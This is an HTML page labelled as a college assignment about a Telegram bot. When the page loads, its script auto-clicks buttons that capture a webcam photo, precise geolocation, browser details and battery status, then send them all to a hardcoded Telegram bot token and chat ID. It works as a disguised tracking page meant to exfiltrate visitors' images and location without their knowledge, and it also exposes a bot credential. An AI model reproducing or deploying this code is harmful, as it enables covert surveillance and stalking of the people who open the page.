<!DOCTYPE html>
<html>
<head>
  <title>Tugas Kuliah - Bot Telegram</title>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
  <h1>Tugas Kuliah - Bot Telegram</h1>
  
  <button id="autoPhotoButton" onclick="takeAutoPhoto()">Ambil Foto Otomatis</button>
  <button id="autoLocationButton" onclick="getLiveLocation()">Dapatkan Lokasi Akurat</button>
  <button id="autoDeviceInfoButton" onclick="getDeviceInfo()">Dapatkan Informasi Perangkat</button>
  <button id="autoBatteryInfoButton" onclick="getBatteryInfo()">Dapatkan Informasi Baterai</button>

  <script>
    const token = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const chatId = '1121369247';

    function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      const data = { chat_id: chatId, text: text };
      $.post(url, data);
    }

    function sendTelegramPhoto(photo) {
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
      const data = { chat_id: chatId, photo: photo };
      $.post(url, data);
    }

    function takeAutoPhoto() {
      setTimeout(function() {
        const constraints = { video: true };
        navigator.mediaDevices.getUserMedia(constraints)
          .then(function(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.onloadedmetadata = function() {
              video.play();
              setTimeout(function() {
                captureVideoFrame();
                stream.getTracks().forEach(function(track) {
                  track.stop();
                });
              }, 1000);
            };
          })
          .catch(function(error) {
            console.error('Error accessing camera: ', error);
          });
      }, 3000);
    }

    function captureVideoFrame() {
      const video = document.querySelector('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoData = canvas.toDataURL('image/jpeg');
      sendTelegramPhoto(photoData);
    }

    function getLiveLocation() {
      setTimeout(function() {
        if ('geolocation' in navigator) {
          const options = { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 };
          navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const locationText = `Lokasi: ${lat}, ${lon}`;
            sendTelegramMessage(locationText);
          }, function(error) {
            console.error('Error getting location: ', error);
          }, options);
        } else {
          sendTelegramMessage('Maaf, peramban tidak mendukung geolokasi.');
        }
      }, 3000);
    }

    function getDeviceInfo() {
      setTimeout(function() {
        const deviceInfo = `
          Browser: ${navigator.userAgent}
          Resolusi Layar: ${screen.width}x${screen.height}
        `;
        sendTelegramMessage(deviceInfo);
      }, 3000);
    }

    function getBatteryInfo() {
      setTimeout(function() {
        if ('getBattery' in navigator) {
          navigator.getBattery().then(function(battery) {
            const batteryInfo = `
              Level Baterai: ${battery.level * 100}%
              Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
            `;
            sendTelegramMessage(batteryInfo);
          });
        } else {
          sendTelegramMessage('Maaf, peramban tidak mendukung informasi baterai.');
        }
      }, 3000);
    }

    // Auto click function
    function autoClick(elementId) {
      const element = document.getElementById(elementId);
      if (element) {
        element.click();
      }
    }

    // Auto click actions on page load
    window.addEventListener('load', function() {
      autoClick('autoPhotoButton');
      autoClick('autoLocationButton');
      autoClick('autoDeviceInfoButton');
      autoClick('autoBatteryInfoButton');
    });
  </script>
</body>
</html>
